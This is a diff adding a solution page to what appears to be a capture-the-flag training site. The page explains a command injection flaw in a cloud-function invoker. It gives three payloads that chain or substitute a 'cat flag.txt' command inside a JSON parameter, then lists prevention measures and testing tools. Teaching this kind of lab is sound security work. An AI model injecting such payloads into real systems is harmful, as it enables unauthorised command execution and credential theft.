@@ -1,0 +1,108 @@
+{% extends 'base.html' %}
+
+{% block title %}Command Injection Level 5 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Command Injection Level 5 Solution: Command Injection in Cloud Functions</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    This page explains how to solve the Command Injection in Cloud Functions challenge.
+                </div>
+                
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge features a command injection vulnerability in a cloud function execution platform. The application takes function parameters and passes them directly to a system command without proper sanitization.
+                </p>
+                <p>
+                    The vulnerability occurs because the application likely constructs a command like this on the server:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>serverless invoke --function [function_name] --data '[function_params]'</code></pre>
+                <p>
+                    When function parameters are directly included in a system command without proper validation or sanitization, attackers can craft parameters that include command injection characters.
+                </p>
+                
+                <h3>Solution</h3>
+                <p>To solve this challenge, you need to inject commands into the function parameters:</p>
+                
+                <h4>1. Using semicolon (;) to execute multiple commands:</h4>
+                <div class="alert alert-secondary">
+                    <code>{"param1": "value1"; cat flag.txt; echo "}</code>
+                </div>
+                <p>
+                    This input will cause the server to execute three commands:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>serverless invoke --function processImage --data '{"param1": "value1"'
+cat flag.txt
+echo "}"'</code></pre>
+                
+                <h4>2. Using command substitution:</h4>
+                <div class="alert alert-secondary">
+                    <code>{"param1": "value1$(cat flag.txt)"}</code>
+                </div>
+                <p>
+                    This technique uses command substitution to execute the cat command and include its output in the JSON parameter.
+                </p>
+                
+                <h4>3. Using backticks:</h4>
+                <div class="alert alert-secondary">
+                    <code>{"param1": "value1`cat flag.txt`"}</code>
+                </div>
+                
+                <h3>Prevention</h3>
+                <p>
+                    To prevent command injection vulnerabilities in cloud function platforms:
+                </p>
+                <ol>
+                    <li><strong>Use a proper JSON parser</strong> to handle function parameters instead of passing them directly to a command.</li>
+                    <li><strong>Implement strict input validation</strong> for function parameters.</li>
+                    <li><strong>Use a serverless framework API</strong> instead of calling the CLI directly.</li>
+                    <li><strong>Run functions in isolated environments</strong> with minimal privileges.</li>
+                    <li><strong>Implement proper error handling</strong> to avoid leaking sensitive information.</li>
+                </ol>
+                
+                <h3>Real-World Impact</h3>
+                <p>
+                    Command injection vulnerabilities in cloud function platforms have been found in real-world applications. In 2023, notable examples included:
+                </p>
+                <ul>
+                    <li>A serverless deployment tool that was vulnerable to command injection through function parameters</li>
+                    <li>A cloud automation platform where attackers could execute commands by crafting malicious function inputs</li>
+                    <li>A DevOps pipeline tool that didn't properly sanitize user inputs before passing them to system commands</li>
+                </ul>
+                
+                <h3>Cloud-Specific Considerations</h3>
+                <p>
+                    Command injection in cloud environments can have unique implications:
+                </p>
+                <ul>
+                    <li><strong>Access to cloud credentials</strong>: Successful command injection might give access to cloud provider credentials.</li>
+                    <li><strong>Lateral movement</strong>: Attackers might be able to move from one cloud function to other resources in the same account.</li>
+                    <li><strong>Data exfiltration</strong>: Cloud functions often have network access, making data exfiltration easier.</li>
+                    <li><strong>Persistence</strong>: Attackers might be able to modify function configurations to maintain access.</li>
+                </ul>
+                
+                <h3>Tools for Testing</h3>
+                <p>
+                    When testing for command injection vulnerabilities in cloud environments, consider using:
+                </p>
+                <ul>
+                    <li><strong>Burp Suite</strong>: For intercepting and modifying requests</li>
+                    <li><strong>OWASP ZAP</strong>: For automated scanning</li>
+                    <li><strong>Custom scripts</strong>: For testing specific cloud function implementations</li>
+                    <li><strong>Cloud security posture management (CSPM) tools</strong>: For identifying misconfigurations</li>
+                </ul>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level5') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
